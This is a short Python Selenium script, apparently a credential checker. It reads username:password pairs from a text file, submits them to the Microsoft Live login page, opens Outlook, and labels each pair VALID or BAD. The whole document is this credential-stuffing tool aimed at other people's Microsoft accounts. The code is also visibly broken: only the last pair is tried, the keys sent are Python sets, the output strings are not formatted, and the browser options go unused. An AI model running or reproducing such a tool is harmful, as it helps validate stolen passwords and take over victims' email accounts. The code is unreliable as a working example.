from selenium import webdriver
from selenium.webdriver.edge.options import Options
from selenium.webdriver.common.by import By
import time
 

driver = webdriver.Edge()

with open('bilo.txt', 'r') as f:
    for line in f:
        username, password = line.strip().split(':')
 
edge_options = Options()
edge_options.add_argument("user-data-dir=C:\\Users\\username\\AppData\\Local\\Microsoft\\Edge\\User Data")
edge_options.add_argument("profile-directory=Default")
driver.get('https://bing.com')
driver.get('https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=19&id=264960&wreply=https%3a%2f%2fwww.bing.com%2fsecure%2fPassport.aspx%3fedge_suppress_profile_switch%3d1%26requrl%3dhttps%253a%252f%252fwww.bing.com%252f%253ftoWww%253d1%2526redig%253dAA7AA39B92914967ABF4C49E48D533D1%2526wlexpsignin%253d1%26sig%3d2941CEB8036F6DC8052EDD44026F6C8B%26nopa%3d2&wp=MBI_SSL&lc=2057&CSRFToken=a477312e-86ba-4e35-8882-405e7286e285&cobrandid=c333cba8-c15c-4458-b082-7c8ce81bee85&aadredir=1&nopa=2')
driver.find_element(By.XPATH,'//*[@id="i0116"]').click()
driver.find_element(By.XPATH,'//*[@id="i0116"]').send_keys({username})
driver.find_element(By.XPATH,'//*[@id="idSIButton9"]').click()
driver.find_element(By.XPATH,'//*[@id="i0118"]').send_keys({password})
time.sleep(2)
driver.find_element(By.XPATH,'//*[@id="idSIButton9"]').click()
time.sleep(2)
driver.find_element(By.XPATH,'//*[@id="idSIButton9"]').click()
driver.get('https://outlook.live.com/')
time.sleep(2)
if driver.find_elements(By.XPATH,'//*[@id="innerRibbonContainer"]/div[1]/div/div/div/div[1]/div/div/span/button[1]'):
    print("\033[92m{username}:{password} VALID")
else:
    print("\033[91m{username}:{password} BAD")


time.sleep(5000)

